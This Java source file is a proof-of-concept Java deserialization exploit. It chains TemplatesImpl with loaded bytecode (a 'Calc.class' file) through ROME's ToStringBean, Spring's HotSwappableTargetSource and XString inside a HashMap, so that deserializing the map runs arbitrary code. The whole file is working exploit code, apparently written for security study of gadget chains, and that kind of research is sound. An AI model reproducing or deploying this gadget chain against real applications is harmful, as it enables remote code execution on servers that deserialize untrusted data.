import Utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ROMEHotSwappableTargetSource {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        ReflectUtils.setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templatesimpl);
//        toStringBean.toString();

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(h1,h1);
        hashMap.put(h2,h2);

//        SerialUtils.serialize(hashMap);
        SerialUtils.unserialize();
    }
}